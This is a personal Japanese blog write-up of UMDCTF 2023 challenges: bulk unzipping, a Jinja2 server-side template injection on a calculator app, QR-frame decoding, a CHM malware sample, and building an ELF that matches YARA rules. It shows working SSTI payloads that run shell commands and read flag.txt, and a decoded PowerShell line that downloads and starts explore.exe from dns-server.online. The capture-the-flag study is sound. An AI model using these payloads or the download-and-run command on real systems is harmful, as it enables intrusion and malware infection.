---
title: "UMDCTF 2023 Writeup"
date: 2023-05-04T14:00:00+09:00
lastmod: 2023-05-29T16:00:00+09:00
draft: false
keywords: []
description: ""
tags: ["CTF", "Reviewed"]
categories: ["CTF"]
author: ""
---
{{% right %}}
<a href="https://translate.google.com/translate?hl=en&sl=auto&tl=en&u=https%3A%2F%2Fcaptureamerica.github.io%2Fwriteups%2Fpost%2Fumdctf_2023%2F">
<img src="https://captureamerica.github.io/writeups/img/En.png" alt="English">
</a>
{{% /right %}}

(2023/05/29 - Yaraチャレンジの復習をしました。下の方に追記してます。)

URL: [https://umdctf.io/challenges](https://umdctf.io/challenges)
<br /><br />

UMDCTF は、3回目の参加です。

[UMDCTF 2020](https://captureamerica.github.io/writeups/post/umdctf_2020/) (147位)

[UMDCTF 2021](https://captureamerica.github.io/writeups/post/umdctf_2021/) (175位)

<br />

今回は 1533 points を取り、161位でした。

<img src="https://captureamerica.github.io/writeups/img/umdctf_2023_Score.png" alt="umdctf_2023_Score.png">

<br />


<img src="https://captureamerica.github.io/writeups/img/umdctf_2023_Challenges1.png" alt="umdctf_2023_Challenges1.png">

<img src="https://captureamerica.github.io/writeups/img/umdctf_2023_Challenges2.png" alt="umdctf_2023_Challenges2.png">

<img src="https://captureamerica.github.io/writeups/img/umdctf_2023_Challenges3.png" alt="umdctf_2023_Challenges3.png">

<img src="https://captureamerica.github.io/writeups/img/umdctf_2023_Challenges4.png" alt="umdctf_2023_Challenges4.png">

<img src="https://captureamerica.github.io/writeups/img/umdctf_2023_Challenges5.png" alt="umdctf_2023_Challenges5.png">

<img src="https://captureamerica.github.io/writeups/img/umdctf_2023_Challenges6.png" alt="umdctf_2023_Challenges6.png">


<br />
日曜日は、大好きなモンハンもやらず、ほぼ丸一日これをやってました。

未着手のチャレンジも多くありますが、やった中でもいくつか面白いチャレンジがあって、良いCTFイベントだった思います。


<br /><br />
## [misc]: Ports (50 points)
- - -
### Challenge
> You are a network packet transporting sensitive information to a very important user. Unfortunately, your human forgot to tell you which port to use. This is a problem as there are 65335 different ports! Luckily, each of these ports might tell you something...
<br /><br />
Note: The password to each encrypted .zip file is the corresponding port number. For example: Password to port-16.txt.zip is simply 16.

Attachment:

- ports.zip

<br />
### Solution

まず、ports.zipを解凍すると、`port-1.txt.zip` 〜 `port-65335.txt.zip` の Zipファイルが出てきます。

（なぜ、`65535` ではなく `65335` だったのかは不明。）

<br />

まずは、一気に解凍してきます。

<pre>
$ for i in {1..65335} ; do (unzip -P $i port-$i.txt.zip) ; done
</pre>

すると今度は、`port-1.txt` 〜 `port-65335.txt` のテキストファイルが出てきます。（後述しますが、厳密には解凍できていないファイルがありました。）

<br />

テキストファイルの中身は、以下のような感じになっていて、別のファイルを見るように指示があります。

<pre>
Go to port 22603 instead :(

Random message: nkjhefswxbtwmxluffgzxyfoybdlpxkxlwrnmfxpalsugtwgjcottukxivjjzwiblnvkpsflmtwjiudvmqjc
</pre>

<br />

おそらく、flagが入っているテキストファイルには、`instead` という文字列が出てこないだろうと予想してgrepしてみたのですが、ファイルが多すぎてエラーになりました。

<pre>
$ grep -v "instead" *.txt > temp.txt
-bash: /usr/bin/grep: Argument list too long
</pre>

<br />

ということで、一旦全てのテキストファイルの中身を一つのファイルにすることにしました。

すると、`port-42237.txt` と `port-42318.txt` が存在していないことに気が付きました。

<pre>
$ for i in {1..65335} ; do (cat port-$i.txt >> ../temp.txt) ; done
cat: port-42237.txt: No such file or directory
cat: port-42318.txt: No such file or directory
</pre>

<br />

どうやら unzip コマンドが失敗していたようです。

個別にコマンドを実行してみると、以下のエラーが出てきました。

<pre>
$ unzip -P 42237 ../zip/port-42237.txt.zip
Archive:  ../zip/port-42237.txt.zip
   skipping: port-42237.txt          need PK compat. v5.1 (can do v4.5)

$ unzip -P 42318 ../zip/port-42318.txt.zip
Archive:  ../zip/port-42318.txt.zip
   skipping: port-42318.txt          need PK compat. v5.1 (can do v4.5)
</pre>

<br />

ちなみに、unzipで解凍できたものと、できなかったもののファイルタイプの違いは以下の通りです。

<pre>
$ file port-42236.txt.zip
port-42236.txt.zip: Zip archive data, at least v2.0 to extract, compression method=deflate

$ file port-42237.txt.zip
port-42237.txt.zip: Zip archive data, at least v5.1 to extract, compression method=AES Encrypted
</pre>


Macの解凍ツールでは普通に解凍できたので、フラグはゲットできました。

<br />

Flag: `UMDCTF{dDSA-d_23+t0ta11y_n0t_NSFW_tCp_pAcKET-0_0-15039254&((*#@!}`




<br /><br />
<br /><br />
## [Web]: pop calc (175 points)
- - -
### Challenge
> We have created a new calculator application to fit all your mathematical needs. Give it a try!
<br /><br />
https://pop-calc.chall.lol

<br />
### Solution

サイトにアクセスすると電卓があり、計算ができるようになっています。

POSTデータを見てみると、`calc=` というパラメータに計算式がセットされて送信されていました。

<br />

試しに Burp Suiteの Repeaterを使って `calc={{ config }}` をPOSTしてみると、設定値が取れました。

以下が、サーバーからのレスポンスです。

<pre>
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Cloud-Trace-Context: 21d9ab888b0014774d78d7ea940cb502;o=1
Date: Sun, 30 Apr 2023 11:33:28 GMT
Server: Google Frontend
Content-Length: 925

[ERROR] &lt;Config {&#39;DEBUG&#39;: False, &#39;TESTING&#39;: False, &#39;PROPAGATE_EXCEPTIONS&#39;: None, &#39;SECRET_KEY&#39;: None, &#39;PERMANENT_SESSION_LIFETIME&#39;: datetime.timedelta(days=31), &#39;USE_X_SENDFILE&#39;: False, &#39;SERVER_NAME&#39;: None, &#39;APPLICATION_ROOT&#39;: &#39;/&#39;, &#39;SESSION_COOKIE_NAME&#39;: &#39;session&#39;, &#39;SESSION_COOKIE_DOMAIN&#39;: None, &#39;SESSION_COOKIE_PATH&#39;: None, &#39;SESSION_COOKIE_HTTPONLY&#39;: True, &#39;SESSION_COOKIE_SECURE&#39;: False, &#39;SESSION_COOKIE_SAMESITE&#39;: None, &#39;SESSION_REFRESH_EACH_REQUEST&#39;: True, &#39;MAX_CONTENT_LENGTH&#39;: None, &#39;SEND_FILE_MAX_AGE_DEFAULT&#39;: None, &#39;TRAP_BAD_REQUEST_ERRORS&#39;: None, &#39;TRAP_HTTP_EXCEPTIONS&#39;: False, &#39;EXPLAIN_TEMPLATE_LOADING&#39;: False, &#39;PREFERRED_URL_SCHEME&#39;: &#39;http&#39;, &#39;TEMPLATES_AUTO_RELOAD&#39;: None, &#39;MAX_COOKIE_SIZE&#39;: 4093}&gt;
</pre>

<br />

SSTI (Server-Side Template Injection) ってやつですかね。

以下を参考にしました。（OSCPのときには、よくお世話になりました。）

[https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti)

<br />

以下のように、任意のコマンドが実行できました。（注: calcの部分は、POSTしているデータのみ書いてます）

<pre>
calc={{ config.__class__.from_envvar.__globals__.import_string("os").popen("ls").read() }}

HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Cloud-Trace-Context: bee9296169e7cb2f70911bff50bc1d16;o=1
Date: Sun, 30 Apr 2023 11:36:12 GMT
Server: Google Frontend
Content-Length: 51

[ERROR] app.py
flag.txt
requirements.txt
templates


calc={{ config.__class__.from_envvar.__globals__.import_string("os").popen("cat flag.txt").read() }}

HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Cloud-Trace-Context: 5de4b10dcbd8accd9395c41818d67939;o=1
Date: Sun, 30 Apr 2023 11:37:10 GMT
Server: Google Frontend
Content-Length: 49

[ERROR] UMDCTF{wh3n_an_app_giv3s_u_ssti_p0p_calc}
</pre>

<br />

Flag: `UMDCTF{wh3n_an_app_giv3s_u_ssti_p0p_calc}`




<br /><br />
<br /><br />
## [Forensics]: Telekinetic Warfare (442 points)
- - -
### Challenge
> Someone was able to exfil a top secret document from our airgapped network! How???

Attachment:

- bruh.gif

<br />
### Solution

QRコードが含まれるアニメーションGIFです。

試しに最初のQRコードを読み取ってみると、Base64でエンコードした文字列が得られました。

10000以上のQRコードが含まれていますが、それらを読み取って一つにまとめてファイルに落とすだけなので、やることは明確です。

<br />

このチャレンジは、Mac PC上で解きました。

下準備。

<pre>
$ pip install pyzbar
$ brew install zbar
$ pip install Pillow
</pre>

<br />

書いたコード：

```Python
#!/usr/bin/env python3
#-*- coding:utf-8 -*-
import base64
from PIL import Image, ImageSequence
from pyzbar.pyzbar import decode

IMAGE_PATH = 'bruh.gif'

def get_frames(path):
    im = Image.open(path)
    return (frame.copy() for frame in ImageSequence.Iterator(im))

outfile = open("brush.pdf", "wb")
frames = get_frames(IMAGE_PATH)
for i, f in enumerate(frames):
    for x in decode(f):
        data = x[0].decode("utf-8")
        outfile.write(base64.b64decode(data))
        # print(base64.b64decode(data))
outfile.close()
```

<br />

Flag: `UMDCTF{wh0_n33d5_k1net1c_w4rfar3_anyw4ys}`


<br /><br />
<br /><br />
## [Forensics]: Malware Chall Disclaimer (0 point)
- - -
### Challenge
> The challenge "Doctors Hate Him" is designed to emulate an actual piece of malware so handle the file with caution. The sample was written by us however it should still be treated as malicious.
<br /><br />
Flag: UMDCTF{i_understand_that_malware_chall_is_sus}

<br />
### Solution

"Doctors Hate Him" のチャレンジは、実際のマルウェアの一部を模倣して作成したものなので、注意を払って扱ってください、みたいなことだそうです。

<br />

Flag: `UMDCTF{i_understand_that_malware_chall_is_sus}`


<br /><br />
<br /><br />
## [Forensics]: Doctors hate him!! (482 points)
- - -
### Challenge
> Someone sent me this in an email... ad targeting is hitting a little too close here smh...

Attachment:

- Doctors-Hate-Him.zip

<br />
### (Unsolved)

イベント中に解けなかったチャレンジですが、途中まではできたので、記録に残しておきます。

Zipファイルには、.chmファイルが入っています。

<br />

実はたまたま最近、.chmファイルタイプのマルウェアを調べる機会があったんですよね。

参考にしたUnit42のブログ：

https://unit42.paloaltonetworks.com/malicious-compiled-html-help-file-agent-tesla/

<br />

.chmファイルは、`7z x`で解凍が可能です。

<br />

解凍して出てくる test.html の中に、Base64でエンコードされている文字列があります。デコードすると、以下になります。

`I.n.v.o.k.e.-.W.e.b.R.e.q.u.e.s.t. .-.U.r.i. .h.t.t.p.:././.d.n.s.-.s.e.r.v.e.r...o.n.l.i.n.e.:.6.9.6.9./.e.x.p.l.o.r.e...e.x.e. .-.O.u.t.F.i.l.e. .e.x.p.l.o.r.e...e.x.e.;. .S.t.a.r.t.-.P.r.o.c.e.s.s. .e.x.p.l.o.r.e...e.x.e.;. .=.'.g.u.r.l._.j.n.a.g._.g.u.r.v.e.'.`

<br />

余計な `.` を取り除いて見やすくすると、以下になります。フラグの一部っぽい文字列 `gurl_jnag_gurve` も見つかります。

<pre>
Invoke-WebRequest -Uri http://dns-server.online:6969/explore.exe -OutFile explore.exe; Start-Process explore.exe; ='gurl_jnag_gurve'.
</pre>

<br />

また、test.html には、コメントが含まれていて、フラグの一部 `UMDCTF{1997_called_` が見つかります。

<br />

`explore.exe`は、実際にダウンロードすることができて、Hash値は `63d961efa8c959a1f890d584daa07beffba0138e296aa08a5d639ef4b5b33d51` です。

<br />

VirusTotalのScoreでは、多くのセキュリティベンダーがマルウェア判定しています。

https://www.virustotal.com/gui/file/63d961efa8c959a1f890d584daa07beffba0138e296aa08a5d639ef4b5b33d51

<br />

ここでPEファイルが入手できたので、静的解析やら動的解析やらをして、フラグの最後のピースを探そうとした人が多かったんじゃないかと思います。

わたしもその内の一人で、ここで詰みました。。

他の方のWriteupを参照すると、http://dns-server.online:6969/ に `present.txt` というファイルがあり、そこから最後のフラグが取れたようですね。

<br />

まぁ、そういうチャレンジもありなのかと思いますが、どうせなら`present.txt`に繋がる情報を`explore.exe`の中に埋め込んでおいて貰えたらもっと親切だったのに、とは思いました。






<br /><br />
<br /><br />
## [Forensics]: YARA Trainer Gym (427 points)
- - -
### Challenge
> My pokemon aren't very strong yet so I need to slip past the sigs written by the 8 YARA gym leaders! Can you help me!!!
<br /><br />
Note: you can run the yara rules locally with yara yara_rules.yar $file
<br /><br />
https://yara-trainer-gym.chall.lol

Attachment:

- yara_rules.yar

中身：
```C
import "elf"
import "math"

rule rule1 {
    condition:
        uint32(0) == 0x464c457f
}

rule rule2 {
    strings:
        $rocket1 = "jessie"
        $rocket2 = "james"
        $rocket3 = "meowth"

    condition:
        all of ($rocket*)
}

rule rule3 {
    meta:
        description = "Number of sections in a binary"
     condition:
        elf.number_of_sections == 40
}

rule rule4 {
    strings:
        $hex1 = {73 6f 6d 65 74 68 69 6e 67 73 6f 6d 65 74 68 69 6e 67 6d 61 6c 77 61 72 65}
        $hex2 = {5445414d524f434b4554}
        $hex3 = {696d20736f207469726564}
        $hex4 = {736c656570792074696d65}

    condition:
        ($hex1 and $hex2) or ($hex3 and $hex4)
}

rule rule5 {
    condition:
        math.entropy(0, filesize) >= 6
}

rule rule6 {
    strings:
        $xor = "aqvkpjmdofazwf{lqjm1310<" xor
    condition:
        $xor
}

rule rule7 {
    condition:
        for any section in elf.sections : (section.name == "poophaha")
}

rule rule8 {
    condition:
        filesize < 2MB and filesize > 1MB
}
```


<br />
### Solution

アクセスしてみると、任意のファイルがアップロードできるようになっています。

スクリーンショットには全部写っていませんが、Gymは1〜8まであります。

<img src="https://captureamerica.github.io/writeups/img/umdctf_2023_Yara.png" alt="umdctf_2023_Yara.png"> <br />

<br />

全てのyara ruleの条件にマッチするELFファイルを作成して、アップロードするとフラグが取れるようです。

これはなかなか面白いチャレンジだと思って、絶対解こうと思って頑張りました。

<br />

まず、rule1ですが、少しググってみたところ、ファイルタイプかマジックナンバーを見ているだけで、ELFファイルであれば簡単にパスできます。

<br />

その他の文字列のチェックをしているrule達は、テキトーにプログラムの中に埋め込めばパスできそうです。

XORをしている rule6 は、CyberChefで Brute Force してみたら、Key=03 でした。

<br />

とりあえず、以下のようなCのコードを書いてコンパイルし、アップロードしてみました。

```C
#include <stdio.h>

int main(int argc, char **argv)
{
    puts("jessie");
    puts("james");
    puts("meowth");
    puts("im so tired");
    puts("sleepy time");
    puts("bruhsinglebytexorin2023?");

    return 0;
}
```

<br />

これだけで、rule1, rule2, rule4, rule6 はクリアできました。

<br />

しかし、ここから section の追加などの仕方がわからず、結構悩みました。

おそらく、ldコマンドでscript fileを使ってオブジェクトファイルをリンクするとできそうなのですが、`gcc -c` で作った.oファイルはldコマンドでうまくリンクできませんでした。

<pre>
$ ld -o a.out YARA_solve.o
ld: warning: cannot find entry symbol _start; defaulting to 0000000000401000
ld: YARA_solve.o: in function `main':
YARA_solve.c:(.text+0x1e): undefined reference to `puts'
ld: YARA_solve.c:(.text+0x2d): undefined reference to `puts'
ld: YARA_solve.c:(.text+0x3c): undefined reference to `puts'
ld: YARA_solve.c:(.text+0x4b): undefined reference to `puts'
ld: YARA_solve.c:(.text+0x5a): undefined reference to `puts'
ld: YARA_solve.o:YARA_solve.c:(.text+0x69): more undefined references to `puts' follow
</pre>


<br />
結局、Cで書くのを諦めて、アセンブラで書きました。

参考にさせていただいたサイト：

http://yaguchi.txt-nifty.com/blog/2006/07/as_ldhello_worl_5d68.html

https://community-ja.renesas.com/cafe_rene/forums-groups/tools/f/forum21/4964/e2-studio

<br />

とりあえず、自分が解いた方法を以下に書きますが、もっと簡単なやり方があるかも知れないです。

<br />

以下が用意したアセンブラのコード。

{{< highlight asm "linenos=table,hl_lines=24 25" >}}
.data
msg:    .ascii  "jessie"
msg2:   .ascii  "james"
msg3:   .ascii  "meowth"
msg4:   .ascii  "im so tired"
msg5:   .ascii  "sleepy time"
msg6:   .ascii  "bruhsinglebytexorin2023?"
msgend: .equ    len, msgend - msg

.text
.globl _start
_start:
      # call system-call 'write'
      movl    $0x4, %eax      # sys-call number.
      movl    $1, %ebx        # file descriptor.
      movl    $msg, %ecx      # data.
      movl    $len, %edx      # data size.
      int     $0x80
      # call system-call 'exit'
      movl    $0x1, %eax      # sys-call number.
      movl    $0, %ebx        # exit code.
      int     $0x80
	
.section .bindata
.incbin "./snow_slide.mp4"
.section poophaha
.section poophaha0
.section poophaha1
.section poophaha2
.section poophaha3
.section poophaha4
.section poophaha5
.section poophaha6
.section poophaha7
.section poophaha8
.section poophaha9
.section poophaha10
.section poophaha11
.section poophaha12
.section poophaha13
.section poophaha14
.section poophaha15
.section poophaha16
.section poophaha17
.section poophaha18
.section poophaha19
.section poophaha20
.section poophaha21
.section poophaha22
.section poophaha23
.section poophaha24
.section poophaha25
.section poophaha26
.section poophaha27
.section poophaha28
.section poophaha29
.section poophaha30
.section poophaha31
.section poophaha32
.section poophaha33
.end
{{< / highlight >}}

<br >

文字列に関しては、.data sectionの辺りに書くだけなので、難しくはないです。

<br />

24, 25行目では、手元にあったテキトーなmp3をインクルードしています。

これで、エントロピーの調整(rule5)と、ファイルサイズの調整(rule8)をしています。

圧縮ファイルでエントロピーがあがるので、.mp4じゃなくても.jpgとかでもいけたはずです。

<br />

あとは、section名を指定しているところと、section数を増やしているところですね。

<br />

Script fileについては、まず、`ld --verbose`コマンドでデフォルトで使われているscript fileを取り出し、それを編集して使いました。

以下は編集後のファイルの抜粋。

{{< highlight asm "linenos=table,hl_lines=14-25 29-32" >}}
/* Script for -z combreloc -z separate-code */
/* Copyright (C) 2014-2022 Free Software Foundation, Inc.
   Copying and distribution of this script, with or without modification,
   are permitted in any medium without royalty provided the copyright
   notice and this notice are preserved.  */
OUTPUT_FORMAT("elf64-x86-64", "elf64-x86-64",
	      "elf64-x86-64")
OUTPUT_ARCH(i386:x86-64)
ENTRY(_start)
SEARCH_DIR("=/usr/local/lib/x86_64-linux-gnu"); SEARCH_DIR("=/lib/x86_64-linux-gnu"); SEARCH_DIR("=/usr/lib/x86_64-linux-gnu"); SEARCH_DIR("=/usr/lib/x86_64-linux-gnu64"); SEARCH_DIR("=/usr/local/lib64"); SEARCH_DIR("=/lib64"); SEARCH_DIR("=/usr/lib64"); SEARCH_DIR("=/usr/local/lib"); SEARCH_DIR("=/lib"); SEARCH_DIR("=/usr/lib"); SEARCH_DIR("=/usr/x86_64-linux-gnu/lib64"); SEARCH_DIR("=/usr/x86_64-linux-gnu/lib");
SECTIONS
{
  PROVIDE (__executable_start = SEGMENT_START("text-segment", 0x400000)); . = SEGMENT_START("text-segment", 0x400000) + SIZEOF_HEADERS;
  .bindata           :
  {
    KEEP (*(.bindata))
  }
  poophaha           :
  {
    KEEP (*(poophaha))
  }
  poophaha1           :
  {
    KEEP (*(poophaha1))
  }
:
(snip)
:
  poophaha33           :
  {
    KEEP (*(poophaha33))
  }
  .interp         : { *(.interp) }
:
(snip)
{{< / highlight >}}

<br />

以下がELFファイルの作成方法です。これはMakefileにしておいて使いました。

<pre>
$ as -o hello_world.o hello_world.asm
$ ld -o hello_world.out -T linker_script.ld hello_world.o
</pre>

<br />

Sectionがちゃんとできているかどうかは、`readelf`コマンドで確認できます。

<pre>
$ readelf -t hello_world.out
</pre>


<br />

ローカルでのテスト結果：

<pre>
$ yara yara_rules.yar hello_world.out
rule1 hello_world.out
rule2 hello_world.out
rule3 hello_world.out
rule4 hello_world.out
rule5 hello_world.out
rule6 hello_world.out
rule7 hello_world.out
rule8 hello_world.out
</pre>

<br />

このファイルを、ウェブサイトにアップロードしたら、フラグが得られました。

<br />

Flag: `UMDCTF{Y0ur3_4_r34l_y4r4_m4573r!}`



<br /><br />
<br /><br />
<img src="https://captureamerica.github.io/writeups/img/orange_bar.png" alt="orange_bar.png">
<br />
ここから下はイベント終了後に行った復習です。

<br />
elfファイルのセクション数を増やすのは、`objcopy` というコマンドが使えたようです。

確かにググったら出てきますね。どうしてイベント中に見つからなかったんだろう。

<img src="https://captureamerica.github.io/writeups/img/umdctf_2023_objcopy.png" alt="umdctf_2023_objcopy.png"> <br />


<br />

ということで、とりあえずC言語でコード（前述）を書いてelfファイルを作った後に、`objcopy`を使うのが手っ取り早い方法だったみたいです。



<pre>
$ objcopy --add-section poophaha=/dev/null YARA_solve.o
</pre>


<br />

エントロピーを上げる方法は、規則性の無いランダムデータ（圧縮データ、暗号化データ）が埋め込まれていればいいので、自分がやったように .jpg や .mpg を含める方法でもよかったのですが、`/dev/urandom` を使うのが正攻法（？）だったようです。

<br />

このランダムデータは、`objcopy` を使って追加するセクション部分に入れてもいいですし、yara ruleの中で位置のチェックはしていないのでファイルの末尾にappendしても行けますね。

<pre>
$ head -c 1500000 /dev/urandom >> YARA_solve.o
</pre>


<br />

手持ちのファイルを使うんだったら、こんな感じ。

<pre>
$ cat snow_slide.mp4 >> YARA_solve.o
</pre>

あるいは、

<pre>
$ objcopy --add-section aaa=snow_slide.mp4 YARA_solve.o
</pre>



<br />

挿入位置に関しては、文字列についても同様で、コードに含めなくても末尾に付ける方法もアリです。

<pre>
$ echo "jessie" >> YARA_solve.o
</pre>



<br /><br />
<br /><br />
- - -
<br /><br />
<br /><br />

